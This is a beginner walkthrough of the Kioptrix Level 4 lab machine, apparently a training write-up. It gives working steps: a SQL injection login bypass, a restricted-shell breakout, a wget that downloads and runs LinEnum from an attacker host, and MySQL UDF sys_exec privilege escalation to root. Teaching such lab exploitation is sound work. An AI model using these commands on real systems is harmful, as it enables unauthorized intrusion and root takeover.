
# Kioptrix Level 4 Walkthrough - Beginner-Friendly Guide  

Welcome to the *Kioptrix Level 4* challenge! This walkthrough will guide you step-by-step to root this virtual machine.  

---

## Introduction  

### What Makes This Challenge Unique?  
While slightly different from the earlier challenges, it stays within the realm of "easy." Designed specifically for beginners, this is an excellent starting point for anyone looking to sharpen their skills.  

### What Will You Learn?  
- *Scanning and enumeration* techniques to gather target information.  
- *Exploiting SQL injection* and bypassing login pages.  
- *Breaking out of restricted shells.*  
- *Privilege escalation* using MySQL’s User Defined Functions (UDFs).  

Let’s dive in and start hacking!

---

## Step 1: Scanning and Enumeration  
*Goal:* Identify open ports, services, and potential vulnerabilities.  

### Nmap Scan  
We start with an Nmap scan to detect services running on the target.  

#### Command:  
```bash
nmap -T4 -sV <ipaddress>

Replace <ipaddress> with the target’s IP address.


Results:

The scan reveals an SMB server running on the target.


---

Enumerating SMB with Enum4Linux

Next, we scan the SMB server using Enum4Linux.

Command:

enum4linux -a <ipaddress>

Results:

The scan reveals three users:

loneferret

john

robert



---

Directory Enumeration

Using Gobuster, we enumerate the web directories.

Command:

gobuster dir -u http://<ipaddress> -w /path/to/wordlist

Results:

We find directories for john and robert, confirming them as potential targets.


---

Step 2: Exploiting the Login Page

Goal: Use SQL injection to bypass the login page and gain access.

Detecting Vulnerability

Visit the target’s webpage. It presents a login form. Test for SQL injection by entering a single quote (') in both the username and password fields.

Results:

The page is vulnerable to SQL injection.


---

Exploiting the Vulnerability

Use one of the usernames discovered during enumeration (e.g., john) and the following SQL payload:

Username: john

Password: '&'


Results:

You successfully bypass the login page and gain access to the application.

Repeat the process for other usernames (robert) to retrieve additional credentials.


---

Logging in via SSH

With valid credentials, attempt an SSH login:

Command:

ssh john@<ipaddress>

Results:

You successfully log in but are restricted to a kshell, which limits the available commands:

cd, clear, echo, exit, help, ll, lpath, ls



---

Breaking Out of the Restricted Shell

Use the echo command to spawn a full shell:

Command:

echo os.system('/bin/bash')

Results:

You now have a full interactive shell!


---

Step 3: Privilege Escalation

Goal: Escalate privileges to root access.

Running LinEnum

To find vulnerabilities, upload and run LinEnum.sh:

Transfer LinEnum to the Target:

1. Start a Python HTTP server on your attacker machine:

python3 -m http.server


2. Download LinEnum on the target:

cd /tmp  
wget http://<attackerIP>:8000/linenum.sh  
chmod +x linenum.sh



Execute LinEnum:

./linenum.sh


---

Discovering MySQL Credentials

LinEnum reveals MySQL root credentials. Connect to the database using:

Command:

mysql -u root -p

Results:

You gain root access to MySQL.


---

Leveraging MySQL for Privilege Escalation

Since MySQL runs as root, you can exploit it to execute system commands using User Defined Functions (UDFs).

Checking Running Processes:

Verify that MySQL runs as root:

ps aux | grep mysql

Listing Installed UDFs:

Run the following SQL query to list installed UDFs:

select * from mysql.func;


---

Using UDFs to Execute Commands

To test command execution, run:

select sys_exec('id');

If no error occurs, the UDF works correctly.


---

Adding User to Admin Group

Add john to the admin group:

select sys_exec('usermod -aG admin john');

Results:

The user john is now an admin.


---

Switching to Root

Return to the shell and switch to root:

sudo su

Results:

You now have root access!


---

Conclusion

Congratulations! You’ve successfully rooted Kioptrix Level 4.

Key Takeaways:

SQL injection is a common vulnerability and should be mitigated through proper input validation.

Breaking out of restricted shells often requires creative use of available commands.

MySQL processes running as root can be a severe security risk when combined with UDFs.


This machine provides a great learning experience for beginner penetration tester. See you in the next challenge!
